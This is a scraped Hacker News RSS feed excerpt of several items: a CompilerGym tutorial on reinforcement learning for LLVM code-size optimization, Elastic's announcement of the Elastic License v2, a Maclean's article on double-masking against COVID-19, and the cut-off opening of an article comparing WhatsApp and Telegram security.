Score 133 | Comments 16 (<a href="https://news.ycombinator.com/item?id=26001480">thread link</a>) | @azhenley
<br/>
February 2, 2021 | https://facebookresearch.github.io/CompilerGym/getting_started.html | <a href="https://web.archive.org/web/*/https://facebookresearch.github.io/CompilerGym/getting_started.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    
    <nav data-toggle="wy-nav-shift">
      
    </nav>

    <section data-toggle="wy-nav-shift">

      
      <nav aria-label="top navigation">
        
          <i data-toggle="wy-nav-top"></i>
          <a href="https://facebookresearch.github.io/CompilerGym/index.html">CompilerGym</a>
        
      </nav>


      <div>
        
        <div>
        
          
















          <div role="main" itemscope="itemscope" itemtype="http://schema.org/Article">
           <div itemprop="articleBody">
            
  <div id="getting-started">

<p><a href="https://colab.research.google.com/github/facebookresearch/CompilerGym/blob/development/examples/getting-started.ipynb"><img alt="https://colab.research.google.com/assets/colab-badge.svg" src="https://colab.research.google.com/assets/colab-badge.svg"></a></p><p>CompilerGym is a toolkit for applying reinforcement learning to compiler
optimization tasks. This document provides a short walkthrough of the key
concepts, using the codesize reduction task of a production-grade compiler
as an example. It will take about 20 minutes to work through. Lets get
started!</p>

<div id="key-concepts">
<h2><a href="#id3">Key Concepts</a><a href="#key-concepts" title="Permalink to this headline">¶</a></h2>
<p>CompilerGym exposes compiler optimization problems as environments for
reinforcement learning. It uses the <a href="https://gym.openai.com/">OpenAI Gym</a>
interface to expose the “agent-environment loop” of reinforcement learning:</p>
<p><img alt="_images/overview.png" src="https://facebookresearch.github.io/CompilerGym/_images/overview.png"></p><p>The ingredients for reinforcement learning that CompilerGym provides are:</p>
<ul>
<li><p><strong>Environment</strong>: a compiler optimization task. For example,
<em>optimizing a C++ graph-traversal program for codesize using LLVM</em>. The
environment encapsulates an instance of a compiler and a particular program
that is being compiled. As an agent interacts with the environment, the state
of the program, and the compiler, can change.</p></li>
<li><p><strong>Action Space</strong>: the actions that may be taken at the current environment
state. For example, this could be a set of optimization transformations that
the compiler can apply to the program.</p></li>
<li><p><strong>Observation</strong>: a view of the current environment state. For example, this
could be the Intermediate Representation (IR) of the program that is being
compiled. The types of observations that are available depend on the compiler.</p></li>
<li><p><strong>Reward</strong>: a metric indicating the quality of the previous action. For
example, for a codesize optimization task this could be the change to the
number of instructions of the previous action.</p></li>
</ul>
<p>A single instance of this “agent-environment loop” represents the compilation of
a particular program. The goal is to develop an agent that maximises the
cumulative reward from these environments so as to produce the best programs.</p>
</div>
<div id="installation">
<h2><a href="#id4">Installation</a><a href="#installation" title="Permalink to this headline">¶</a></h2>
<p>Install the latest CompilerGym release using:</p>
<div><div><pre><span></span>$ pip install compiler_gym
</pre></div>
</div>
<p>The binary works on macOS and Linux (on Ubuntu 18.04, Fedora 28, Debian
10 or newer equivalents).</p>
<div id="building-from-source">
<h3><a href="#id5">Building from Source</a><a href="#building-from-source" title="Permalink to this headline">¶</a></h3>
<p>If you prefer, you may build from source. This requires a modern C++
toolchain. On macOS you can use the system compiler. On linux, install
the required toolchain using:</p>
<div><div><pre><span></span>$ sudo apt install clang libtinfo5 patchelf
$ export CC=clang
$ export CXX=clang++
</pre></div>
</div>
<p>We recommend using
<a href="https://docs.conda.io/projects/conda/en/latest/user-guide/install/">conda</a>
to manage the remaining build dependencies. First create a conda
environment with the required dependencies:</p>
<div><div><pre><span></span>$ conda create -n compiler_gym python=3.8 bazel=3.1.0 cmake pandoc
$ conda activate compiler_gym
</pre></div>
</div>
<p>Then clone the CompilerGym source code using:</p>
<div><div><pre><span></span>$ git clone https://github.com/facebookresearch/CompilerGym.git
$ cd CompilerGym
</pre></div>
</div>
<p>Install the python development dependencies using:</p>

<p>Then run the test suite to confirm that everything is working:</p>

<p>To build and install the python package, run:</p>

<p>When you are finished, you can deactivate and delete the conda
environment using:</p>
<div><div><pre><span></span>$ conda deactivate
$ conda env remove -n compiler_gym
</pre></div>
</div>
</div>
</div>
<div id="using-compilergym">
<h2><a href="#id6">Using CompilerGym</a><a href="#using-compilergym" title="Permalink to this headline">¶</a></h2>
<p>Begin by firing up a python interpreter:</p>

<p>To start with we import the gym module and the CompilerGym environments:</p>
<div><div><pre><span></span><span>&gt;&gt;&gt; </span><span>import</span> <span>gym</span>
<span>&gt;&gt;&gt; </span><span>import</span> <span>compiler_gym</span>
</pre></div>
</div>
<p>Importing <a href="https://facebookresearch.github.io/CompilerGym/compiler_gym/compiler_gym.html#module-compiler_gym" title="compiler_gym"><code><span>compiler_gym</span></code></a> automatically registers the compiler environments.</p>
<p>We can see what environments are available using:</p>
<div><div><pre><span></span><span>&gt;&gt;&gt; </span><span>compiler_gym</span><span>.</span><span>COMPILER_GYM_ENVS</span>
<span>['llvm-v0', 'llvm-ic-v0', 'llvm-autophase-ic-v0', 'llvm-ir-ic-v0']</span>
</pre></div>
</div>
<div id="selecting-an-environment">
<h3><a href="#id7">Selecting an environment</a><a href="#selecting-an-environment" title="Permalink to this headline">¶</a></h3>
<p>CompilerGym environments are named using one of the following formats:</p>
<ol>
<li><p><code><span>&lt;compiler&gt;-&lt;observation&gt;-&lt;reward&gt;-&lt;version&gt;</span></code></p></li>
<li><p><code><span>&lt;compiler&gt;-&lt;reward&gt;-&lt;version&gt;</span></code></p></li>
<li><p><code><span>&lt;compiler&gt;-&lt;version&gt;</span></code></p></li>
</ol>
<p>Where <code><span>&lt;compiler&gt;</span></code> identifiers the compiler optimization task,
<code><span>&lt;observation&gt;</span></code> is the default type of observations that are provided,
and <code><span>&lt;reward&gt;</span></code> is the reward signal.</p>
<div>
<p>Note</p>
<p>A key concept is that
CompilerGym environments enables <strong>lazy evaluation</strong> of observations and
reward signals. This makes the environment much more computationally
efficient for scenarios in which you do not need to compute a reward or
observation for every step. If an environment omits a <code><span>&lt;observation&gt;</span></code>
or <code><span>&lt;reward&gt;</span></code> tag, this means that no observation or reward is
provided by default. See <a href="https://facebookresearch.github.io/CompilerGym/compiler_gym/views.html"><span>compiler_gym.views</span></a> for
further details.</p>
</div>
<p>For this tutorial, we will use the following environment:</p>
<ul>
<li><p><strong>Compiler</strong>: <a href="https://facebookresearch.github.io/CompilerGym/llvm/index.html"><span>LLVM</span></a>.</p></li>
<li><p><strong>Observation Type</strong>: <a href="https://facebookresearch.github.io/CompilerGym/llvm/index.html#autophase"><span>Autophase</span></a>.</p></li>
<li><p><strong>Reward Signal</strong>: <a href="https://facebookresearch.github.io/CompilerGym/llvm/index.html#codesize"><span>IR Instruction count relative to -Oz</span></a>.</p></li>
</ul>
<p>Create an instance of this environment using:</p>
<div><div><pre><span></span><span>&gt;&gt;&gt; </span><span>env</span> <span>=</span> <span>gym</span><span>.</span><span>make</span><span>(</span><span>"llvm-autophase-ic-v0"</span><span>)</span>
</pre></div>
</div>
</div>
<div id="installing-benchmarks">
<h3><a href="#id8">Installing benchmarks</a><a href="#installing-benchmarks" title="Permalink to this headline">¶</a></h3>
<p>A compiler requires a program as input. For the purposes of CompilerGym we call
these input programs <em>benchmarks</em>, and collections of benchmarks are assembled
into <em>datasets</em>. You may provide your own programs to use as benchmarks, or
download one of our pre-assembled datasets.</p>
<p>The benchmarks that are available to an environment can be queried using
<a href="https://facebookresearch.github.io/CompilerGym/compiler_gym/envs.html#compiler_gym.envs.CompilerEnv.benchmarks" title="compiler_gym.envs.CompilerEnv.benchmarks"><code><span>env.benchmarks</span></code></a>:</p>

<p>As you can see, there are no benchmarks installed by default. We have provided
a collection of pre-assembled
<a href="https://facebookresearch.github.io/CompilerGym/llvm/index.html#datasets"><span>LLVM benchmark datasets</span></a> that can be
installed using
<a href="https://facebookresearch.github.io/CompilerGym/compiler_gym/envs.html#compiler_gym.envs.CompilerEnv.require_dataset" title="compiler_gym.envs.CompilerEnv.require_dataset"><code><span>env.require_dataset()</span></code></a>.
For this tutorial we will use the
<a href="https://www.nas.nasa.gov/publications/npb.html">NAS Parallel Benchmarks</a>
dataset:</p>
<div><div><pre><span></span><span>&gt;&gt;&gt; </span><span>env</span><span>.</span><span>require_dataset</span><span>(</span><span>"npb-v0"</span><span>)</span>
</pre></div>
</div>
<p>Now, <a href="https://facebookresearch.github.io/CompilerGym/compiler_gym/envs.html#compiler_gym.envs.CompilerEnv.benchmarks" title="compiler_gym.envs.CompilerEnv.benchmarks"><code><span>env.benchmarks</span></code></a> lists
the 123 benchmarks that comprise the dataset we just installed:</p>
<div><div><pre><span></span><span>&gt;&gt;&gt; </span><span>env</span><span>.</span><span>benchmarks</span>
<span>['benchmark://npb-v0/46', 'benchmark://npb-v0/17', ...]</span>
</pre></div>
</div>
</div>
<div id="the-compiler-environment">
<h3><a href="#id9">The compiler environment</a><a href="#the-compiler-environment" title="Permalink to this headline">¶</a></h3>
<p>If you have experience using <a href="https://gym.openai.com/">OpenAI Gym</a>, the
CompilerGym environments will be familiar. If not, you can call <code><span>help()</span></code>
on any function, object, or method to query the documentation:</p>

<p>The action space is described by
<a href="https://facebookresearch.github.io/CompilerGym/compiler_gym/envs.html#compiler_gym.envs.CompilerEnv.action_space" title="compiler_gym.envs.CompilerEnv.action_space"><code><span>env.action_space</span></code></a>.
The <a href="https://facebookresearch.github.io/CompilerGym/llvm/index.html#action-space"><span>LLVM Action Space</span></a> is discrete:</p>
<div><div><pre><span></span><span>&gt;&gt;&gt; </span><span>env</span><span>.</span><span>action_space</span><span>.</span><span>dtype</span>
<span>dtype('int64')</span>
<span>&gt;&gt;&gt; </span><span>env</span><span>.</span><span>action_space</span><span>.</span><span>n</span>
<span>138</span>
</pre></div>
</div>
<p>The observation space is described by
<a href="https://facebookresearch.github.io/CompilerGym/compiler_gym/envs.html#compiler_gym.envs.CompilerEnv.observation_space" title="compiler_gym.envs.CompilerEnv.observation_space"><code><span>env.observation_space</span></code></a>.
The <a href="https://facebookresearch.github.io/CompilerGym/llvm/index.html#autophase"><span>Autophase</span></a> observation space is a 56-dimension
vector of integers:</p>
<div><div><pre><span></span><span>&gt;&gt;&gt; </span><span>env</span><span>.</span><span>observation_space</span><span>.</span><span>shape</span>
<span>(56,)</span>
<span>&gt;&gt;&gt; </span><span>env</span><span>.</span><span>observation_space</span><span>.</span><span>dtype</span>
<span>dtype('int64')</span>
</pre></div>
</div>
<p>The upper and lower bounds of the reward signal are described by
<code><span>env.reward_range</span></code>:</p>
<div><div><pre><span></span><span>&gt;&gt;&gt; </span><span>env</span><span>.</span><span>reward_range</span>
<span>(0.0, inf)</span>
</pre></div>
</div>
<p>As with other Gym environments,
<a href="https://facebookresearch.github.io/CompilerGym/compiler_gym/envs.html#compiler_gym.envs.CompilerEnv.reset" title="compiler_gym.envs.CompilerEnv.reset"><code><span>reset()</span></code></a>
must be called before a CompilerGym environment may be used:</p>
<div><div><pre><span></span><span>&gt;&gt;&gt; </span><span>env</span><span>.</span><span>reset</span><span>()</span>
<span>array([   0,    0,  399,  381,   10,  399,  147,    8,  137,  147,    0,</span>
<span>          0,    0,  556,    0,  546,    0,   15,  693,  574, 1214, 1180,</span>
<span>        384,  399,  214,    0,  120,  116,    0,   88,  468,    8,  546,</span>
<span>         16, 1073,  147,    0, 1551,    0,    0,    0,   10,  766,    0,</span>
<span>          0,  505,   46,    0,    0,    0,  556, 5075, 3261,   13,    0,</span>
<span>       2441])</span>
</pre></div>
</div>
<p>The numpy array that is returned here is the initial
<a href="https://facebookresearch.github.io/CompilerGym/llvm/index.html#autophase"><span>Autophase</span></a> observation. Calling
<a href="https://facebookresearch.github.io/CompilerGym/compiler_gym/envs.html#compiler_gym.envs.CompilerEnv.reset" title="compiler_gym.envs.CompilerEnv.reset"><code><span>env.reset()</span></code></a> starts an
instance of the compiler and selects a random benchmark to use. You can see
which benchmark is currently being used by an environment using
<a href="https://facebookresearch.github.io/CompilerGym/compiler_gym/envs.html#compiler_gym.envs.CompilerEnv.benchmark" title="compiler_gym.envs.CompilerEnv.benchmark"><code><span>env.benchmark</span></code></a>:</p>
<div><div><pre><span></span><span>&gt;&gt;&gt; </span><span>env</span><span>.</span><span>benchmark</span>
<span>'benchmark://npb-v0/90'</span>
</pre></div>
</div>
<p>If we want to force the environment to use a specific benchmark, we can pass the
name of the benchmark as an argument to
<a href="https://facebookresearch.github.io/CompilerGym/compiler_gym/envs.html#compiler_gym.envs.CompilerEnv.reset" title="compiler_gym.envs.CompilerEnv.reset"><code><span>env.reset()</span></code></a>:</p>
<div><div><pre><span></span><span>&gt;&gt;&gt; </span><span>env</span><span>.</span><span>reset</span><span>(</span><span>benchmark</span><span>=</span><span>"benchmark://npb-v0/50"</span><span>)</span>
<span>array([   0,    0,   26,   25,    1,   26,   10,    1,    8,   10,    0,</span>
<span>          0,    0,   37,    0,   36,    0,    2,   46,  175, 1664, 1212,</span>
<span>        263,   26,  193,    0,   59,    6,    0,    3,   32,    0,   36,</span>
<span>         10, 1058,   10,    0,  840,    0,    0,    0,    1,  416,    0,</span>
<span>          0,  148,   60,    0,    0,    0,   37, 3008, 2062,    9,    0,</span>
<span>       1262])</span>
</pre></div>
</div>
</div>
<div id="interacting-with-the-environment">
<h3><a href="#id10">Interacting with the environment</a><a href="#interacting-with-the-environment" title="Permalink to this headline">¶</a></h3>
<p>Once an environment has been initialized, you interact with it in the same way
that you would with any other <a href="https://gym.openai.com/">OpenAI Gym</a>
environment. <a href="https://facebookresearch.github.io/CompilerGym/compiler_gym/envs.html#compiler_gym.envs.LlvmEnv.render" title="compiler_gym.envs.LlvmEnv.render"><code><span>env.render()</span></code></a> prints
the Intermediate Representation (IR) of the program in the current state:</p>
<div><div><pre><span></span><span>&gt;&gt;&gt; </span><span>env</span><span>.</span><span>render</span><span>()</span>
<span>; ModuleID = 'benchmark://npb-v0/83'</span>
<span>target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"</span>
<span>target triple = "x86_64-pc-linux-gnu"</span>
<span>...</span>
</pre></div>
</div>
<p><a href="https://facebookresearch.github.io/CompilerGym/compiler_gym/envs.html#compiler_gym.envs.CompilerEnv.step" title="compiler_gym.envs.CompilerEnv.step"><code><span>env.step()</span></code></a> runs an action:</p>
<div><div><pre><span></span><span>&gt;&gt;&gt; </span><span>observation</span><span>,</span> <span>reward</span><span>,</span> <span>done</span><span>,</span> <span>info</span> <span>=</span> <span>env</span><span>.</span><span>step</span><span>(</span><span>0</span><span>)</span>
</pre></div>
</div>
<p>This returns four values: a new observation, a reward, a boolean value
indicating whether the episode has ended, and a dictionary of additional
information:</p>
<div><div><pre><span></span><span>&gt;&gt;&gt; </span><span>observation</span>
<span>array([   0,    0,   26,   25,    1,   26,   10,    1,    8,   10,    0,</span>
<span>          0,    0,   37,    0,   36,    0,    2,   46,  175, 1664, 1212,</span>
<span>        263,   26,  193,    0,   59,    6,    0,    3,   32,    0,   36,</span>
<span>         10, 1058,   10,    0,  840,    0,    0,    0,    1,  416,    0,</span>
<span>          0,  148,   60,    0,    0,    0,   37, 3008, 2062,    9,    0,</span>
<span>       1262])</span>
<span>&gt;&gt;&gt; </span><span>reward</span>
<span>0.3151595744680851</span>
<span>&gt;&gt;&gt; </span><span>done</span>
<span>False</span>
<span>&gt;&gt;&gt; </span><span>info</span>
<span>{'action_had_no_effect': True, 'new_action_space': False}</span>
</pre></div>
</div>
<p>For this environment, reward represents the reduction in code size of the
previous action, scaled to the total codesize reduction achieved with LLVM’s
<code><span>-Oz</span></code> optimizations enabled. A cumulative reward greater than one means
that the sequence of optimizations performed yields better results than LLVM’s
default optimizations. Let’s run 100 random actions and see how close we can
get:</p>
<div><div><pre><span></span><span>&gt;&gt;&gt; </span><span>env</span><span>.</span><span>reset</span><span>(</span><span>benchmark</span><span>=</span><span>"benchmark://npb-v0/50"</span><span>)</span>
<span>&gt;&gt;&gt; </span><span>episode_reward</span> <span>=</span> <span>0</span>
<span>&gt;&gt;&gt; </span><span>for</span> <span>i</span> <span>in</span> <span>range</span><span>(</span><span>1</span><span>,</span> <span>101</span><span>):</span>
<span>... </span>    <span>observation</span><span>,</span> <span>reward</span><span>,</span> <span>done</span><span>,</span> <span>info</span> <span>=</span> <span>env</span><span>.</span><span>step</span><span>(</span><span>env</span><span>.</span><span>action_space</span><span>.</span><span>sample</span><span>())</span>
<span>... </span>    <span>if</span> <span>done</span><span>:</span>
<span>... </span>        <span>break</span>
<span>... </span>    <span>episode_reward</span> <span>+=</span> <span>reward</span>
<span>... </span>    <span>print</span><span>(</span><span>f</span><span>"Step </span><span>{</span><span>i</span><span>}</span><span>, quality=</span><span>{</span><span>episode_reward</span><span>:</span><span>.3%</span><span>}</span><span>"</span><span>)</span>
<span>...</span>
<span>Step 1, quality=44.299%</span>
<span>Step 2, quality=44.299%</span>
<span>Step 3, quality=44.299%</span>
<span>Step 4, quality=44.299%</span>
<span>Step 5, quality=44.299%</span>
<span>Step 6, quality=54.671%</span>
<span>Step 7, quality=54.671%</span>
<span>Step 8, quality=54.608%</span>
<span>Step 9, quality=54.608%</span>
<span>Step 10, quality=54.608%</span>
<span>Step 11, quality=54.608%</span>
<span>Step 12, quality=54.766%</span>
<span>Step 13, quality=54.766%</span>
<span>Step 14, quality=53.650%</span>
<span>Step 15, quality=53.650%</span>
<span>...</span>
<span>Step 97, quality=88.104%</span>
<span>Step 98, quality=88.104%</span>
<span>Step 99, quality=88.104%</span>
<span>Step 100, quality=88.104%</span>
</pre></div>
</div>
<p>Not bad, but clearly there is room for improvement! Because at each step we are
taking random actions, your results will differ with every run. Try running it
again. Was the result better or worse? Of …</p></div></div></div></div></div></div></div></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://facebookresearch.github.io/CompilerGym/getting_started.html">https://facebookresearch.github.io/CompilerGym/getting_started.html</a></em></p>]]>
            </description>
            <link>https://facebookresearch.github.io/CompilerGym/getting_started.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26001480</guid>
            <pubDate>Tue, 02 Feb 2021 14:43:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Elastic License v2, simplified and more permissive]]>
            </title>
            <description>
<![CDATA[
Score 10 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26001297">thread link</a>) | @dhd415
<br/>
February 2, 2021 | https://www.elastic.co/blog/elastic-license-v2 | <a href="https://web.archive.org/web/*/https://www.elastic.co/blog/elastic-license-v2">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="__next"><div><div><div><section><div><div><div><div><div><p>When we announced our license change for Elasticsearch and Kibana, moving the Apache 2.0-licensed source code to be dual licensed under both the Elastic License and SSPL, we also <a href="https://www.elastic.co/blog/license-change-clarification">mentioned</a> we would work closely with the community on a simplified and more permissive version of the Elastic License. I am happy to share the results with you.</p><p>The Elastic License is already widely used. More than 90% of our downloads are under the Elastic License, and those users enjoy the significant additional <a href="https://www.elastic.co/subscriptions">value provided</a> under the free and open Basic tier. Thanks to this value, the majority of our users and community are already using the software under the Elastic License, so they viewed our recent license change as a non-event. We are happy to see it, because our intent is to minimize any disruption to our community.</p><p>We took this opportunity to engage with our community and find ways to further simplify the Elastic License. After talking to users who reached out for clarification, we believe this new version will help to significantly address the majority of your&nbsp;concerns while protecting our products from <a href="https://twitter.com/kimchy/status/1351534442993446917">abuse, misinformation, and confusion</a>.
</p></div><h2>Elastic License v2
</h2><p>The <a href="https://www.elastic.co/licensing/elastic-license">Elastic License v2 (ELv2)</a> is a very simple, non-copyleft license, allowing for the right to "use, copy, distribute, make available, and prepare derivative works of the software” and has only three high-level limitations. You cannot:
</p><ol><li>Provide the products to others as a managed service&nbsp;</li><li>Circumvent the license key functionality or remove/obscure features protected by license keys&nbsp;</li><li>Remove or obscure any licensing, copyright, or other notices</li></ol><p>ELv2 applies to all of Elasticsearch and Kibana. It covers the distribution as well as the source code of all free and paid features.<br></p><p>We share our source code for both free and paid features in the spirit of openness. Unfortunately, our <a href="https://www.elastic.co/blog/dear-search-guard-users-including-amazon-elasticsearch-service-open-distro-and-others">copyrights</a> and <a href="https://twitter.com/kimchy/status/1351534442993446917">trademarks</a> have been abused and misused. Our goal with this updated license is to be as permissive as possible while including a minimum set of protections. I hope these protections make sense. <a href="https://www.elastic.co/licensing/elastic-license/faq">See our FAQ</a> for more information about ELv2.
</p><div><p>We created ELv2 to hopefully allow others to adopt it. This is the license we wished was available in 2015 when we were a small company facing <a href="https://twitter.com/kimchy/status/1351534442993446917">misinformation</a>. It incorporates all of our learnings from our experience and others who have made similar changes (<a href="https://www.mongodb.com/blog/post/mongodb-now-released-under-the-server-side-public-license">MongoDB</a>, <a href="https://www.cockroachlabs.com/blog/oss-relicensing-cockroachdb/">CockroachDB</a>, <a href="https://redislabs.com/blog/redis-labs-modules-license-changes/">RedisLabs</a>, <a href="https://blog.timescale.com/blog/building-open-source-business-in-cloud-era-v2/">TimescaleDB</a>, <a href="https://www.graylog.org/post/graylog-v4-0-licensing-sspl">Graylog</a>, etc.). Hopefully we helped a little here. There are many companies out there facing a similar decision. I hope that over time, those of us with similar goals can coalesce around a smaller number of licenses and that ELv2 will be a catalyst for that.</p><p>In that spirit, we worked on ELv2 with <a href="https://heathermeeker.com/about-me/">Heather Meeker</a>, a lawyer who is well known for helping to draft many OSS licenses, including the Mozilla Public License 2.0, as well as helping a number of organizations build similar-in-spirit licenses like the <a href="https://www.confluent.io/confluent-community-license/">Confluent Community License</a>, <a href="https://www.mongodb.com/licensing/server-side-public-license/faq">SSPL</a>, and others. We are also reaching out to initiatives like the <a href="https://polyformproject.org/">Polyform Project</a> and <a href="https://faircode.io/">Fair-code</a> as additional efforts to raise awareness of this license and look for ways to promote its wider use.&nbsp;
</p></div><h2>SSPL remains an option for the source code
</h2><div><p>We added <a href="https://www.mongodb.com/licensing/server-side-public-license">SSPL</a>, which is a copyleft license created by <a href="https://www.mongodb.com/blog/post/mongodb-now-released-under-the-server-side-public-license">MongoDB</a>, as an option to minimize the effect this license change would have on our users. MongoDB is one of the most popular projects out there, used by millions of developers who are happy with SSPL. </p><p>Since we made this announcement, we had many of our users reach out and say that they are thankful we provided this option. Their organizations are already using MongoDB, and this made our license change a non-event for them.</p><p>The SSPL is a licensing option for the source code, as shown below:
</p></div><p><img src="https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/bltd65944c1b54a1e0b/6018987f29a02c49ba1f3e4a/chart-license-update-2021.jpg"></p><p>And to be clear, we are <a href="https://writing.kemitchell.com/2021/01/20/Righteous-Expedient-Wrong.html">still</a> not claiming that either SSPL or the Elastic License are OSI-approved licenses.
</p><h2>Still no impact to our cloud and on-premises customers&nbsp;
</h2><p>It is important to repeat: there is no impact to any of our Elastic Cloud or self-managed customers. Our customers already use the default distribution under the Elastic License, and their use is governed by the terms of their subscription agreement, which continues to grant them access to additional features, access to support, and other Elastic commitments (for example, IP infringement indemnification) as before.
</p><h2>The path forward
</h2><p>These changes, including making the Elastic License more permissive, are intended to help us focus on building great products and investing in our community. This means building more great features, many of which we will provide for free and which will be developed in the open. But our commitment goes beyond the code. These license changes let us focus on what matters: helping you find success with our products.
</p></div></div></div></div></section></div></div></div></div></div>]]>
            </description>
            <link>https://www.elastic.co/blog/elastic-license-v2</link>
            <guid isPermaLink="false">hacker-news-small-sites-26001297</guid>
            <pubDate>Tue, 02 Feb 2021 14:30:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Should I be wearing two masks?]]>
            </title>
            <description>
<![CDATA[
Score 17 | Comments 42 (<a href="https://news.ycombinator.com/item?id=26001277">thread link</a>) | @fortran77
<br/>
February 2, 2021 | https://www.macleans.ca/news/should-i-be-wearing-two-masks/ | <a href="https://web.archive.org/web/*/https://www.macleans.ca/news/should-i-be-wearing-two-masks/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>With the arrival of new, more contagious variants of COVID-19 in Canada, experts are recommending an upgrade in the quality—and quantity—of our face coverings</p><div>
																		<p><span>Look at photos of </span><a href="https://www.huffingtonpost.ca/entry/double-mask-coronavirus_ca_60140605c5b653f644d2ed5b?ncid=tweetlnkcahpmg00000002"><span>President Joe Biden and you’ll notice he often wears two masks</span></a><span>: a light cloth or paper one over a heavy-duty N95 mask. “If you have a physical covering with one layer, you put another layer on,” </span><a href="https://www.cnbc.com/2021/01/25/dr-fauci-double-mask-during-covid-makes-common-sense-more-effective.html"><span>said Dr. Anthony Fauci</span></a><span>, who has also frequently </span><a href="https://twitter.com/MayorBowser/status/1341835973722734592?s=20"><span>worn two masks</span></a><span>. “It just makes common sense that it likely would be more effective.”&nbsp;</span></p>
<p><span>But there is also some urgency to this shift: With the arrival of new and more contagious variants to Canada, experts are asking everyone to think once again about the quality of our masks and how we use them. “We all need a bit of a reset regarding [COVID-19] precautions,” says Dr. Lynora Saxinger, </span><span>an infectious diseases physician in Edmonton. “We tend to cut corners and relax when something becomes commonplace.”&nbsp;</span></p>
<p><span>For one thing, she says,</span><span> don’t shove a mask into your pocket after wearing it; if you’re asymptomatic, then the virus will be easily transferred from the mask to your hands. For another, don’t be complacent regarding the type and quality of your face coverings, such as masks that are comfortable to wear because they use porous materials, or </span><a href="https://www.canada.ca/en/public-health/services/diseases/2019-novel-coronavirus-infection/prevention-risks/about-non-medical-masks-face-coverings.html#a9"><span>neck gaiters, which can easily slip</span></a><span>.&nbsp;</span></p>
<blockquote><p><strong>RELATED:&nbsp;<a href="https://www.macleans.ca/society/health/covid-19-in-canada-how-our-battle-against-the-second-wave-is-going/" target="_blank" rel="noopener">COVID-19 in Canada: How our battle against the second wave is going</a></strong></p></blockquote>
<p><span>In fact, many of the masks we’re using aren’t as good as they should be. And, unlike last spring when the initial guidance around masks included recommending face coverings of tightly woven fabric, the risk perception has now changed. The new variants are so much more effective at infecting people that it’s time for a refresher course in face protection.&nbsp;</span></p>
<p><a href="https://www.canada.ca/en/public-health/services/diseases/2019-novel-coronavirus-infection/prevention-risks/about-non-medical-masks-face-coverings.html"><span>Health Canada’s guidelines</span></a><span> emphasize that masks need proper structure, material and fit to reduce the spread of infectious respiratory droplets. For example, Saxinger uses a couple of well-fitted multi-layer fabric masks, each with added filters of polypropylene material which she bought separately, in addition to cycling through lightly-worn medical masks, which she stores in separate envelopes for a few days before using them. And now, unlike in the spring, medical-quality disposable masks as well as more tightly fitted KN95 masks are available through retailers</span> <span>including </span><a href="https://www.costco.ca/kn95-disposable-5-layer-face-mask%2C-20-pack.product.100672009.html"><span>Costco</span></a><span>, </span><a href="https://www.canadiansafetysupplies.com/Level-2-Hospital-Medical-3-Ply-Surgical-Masks-p/350117.htm?gclid=Cj0KCQiA6t6ABhDMARIsAONIYywfEhF1lBHDuf6XEc1nB9jQgZ_kni7_n69ikdQ7cCcEJJR2jNETNncaAti8EALw_wcB"><span>health care supply firms</span></a><span> and </span><a href="https://www.wellwise.ca/en-ca/products/total-care-kn95-mask"><span>pharmacies</span></a><span> (supplies can fluctuate; also, many of the disposable masks and KN95s on the market are not medical grade).&nbsp;</span></p>
<blockquote><p><strong>RELATED:&nbsp;<a href="https://www.macleans.ca/opinion/20000-canadians-have-died-of-covid-19-each-of-their-stories-teaches-us-about-life/" target="_blank" rel="noopener">20,000 Canadians have died of COVID-19. Each of their stories teaches us about life.</a></strong></p></blockquote>
<p><span>While there is no official Canadian or U.S. guidance regarding double-masking or the need to upgrade to better quality masks, </span><a href="https://www.npr.org/sections/coronavirus-live-updates/2021/01/26/960893423/some-european-countries-move-to-require-medical-grade-masks-in-public"><span>Germany, Austria and France</span></a><span> recently told their residents to upgrade their face coverings from cloth versions to specific medical-grade ones, including KN95s, when they are in public spaces, including stores, or when near others for a prolonged period.&nbsp;&nbsp;&nbsp;</span></p>
<p><span>“The more layers the better, as long as they are breathable,” says Saxinger. Doubling up with whatever masks you have—whether two cloth ones, or a cloth and a disposable one—can offer more protection, as they can provide another layer of filtration and force a tighter fit.&nbsp;</span></p>
<blockquote><p><strong>RELATED:&nbsp;<a href="https://www.macleans.ca/news/how-much-protection-does-the-first-dose-of-the-covid-19-vaccine-provide/" target="_blank" rel="noopener">How much protection does the first dose of the COVID-19 vaccine provide?</a></strong></p></blockquote>
<p><span>In a </span><a href="https://www.cell.com/med/pdf/S2666-6340(20)30072-6.pdf"><span>recent commentary in </span><i><span>Med</span></i></a><span>, two experts in the transmission of viruses gave two recommendations to the public: either wear a properly layered, fitted cloth mask or double up and “wear a cloth mask tightly on top of a surgical mask where the surgical mask acts as a filter and the cloth mask provides an additional layer of filtration while improving the fit.” </span></p>

				
			</div></div>]]>
            </description>
            <link>https://www.macleans.ca/news/should-i-be-wearing-two-masks/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26001277</guid>
            <pubDate>Tue, 02 Feb 2021 14:28:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[On the Security of WhatsApp and Telegram]]>
            </title>
            <description>
<![CDATA[
Score 42 | Comments 18 (<a href="https://news.ycombinator.com/item?id=26001191">thread link</a>) | @tyrion
<br/>
February 2, 2021 | https://germano.dev/whatsapp-vs-telegram/ | <a href="https://web.archive.org/web/*/https://germano.dev/whatsapp-vs-telegram/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div>

<p>Many people, even among security experts and privacy advocates, hold the firm
belief that WhatsApp is more <em>secure</em> and privacy-wise better than Telegram.
After having thoroughly studied the issue, I do not believe this to be true.
In this article I will try to highlight the necessary facts to enable the
reader to form a more informed opinion on the matter.</p>
<section>
<h2 id="contents">Contents</h2>
<ol>
<li><a href="#prologue">Prologue</a></li>
<li><a href="#fallacies">The fallacies</a></li>
<li><a href="#threat-modeling">Threat modeling</a></li>
<li><a href="#e2ee">End-to-end encryption</a><ol>
<li><a href="#app-trust">Trust in the app</a></li>
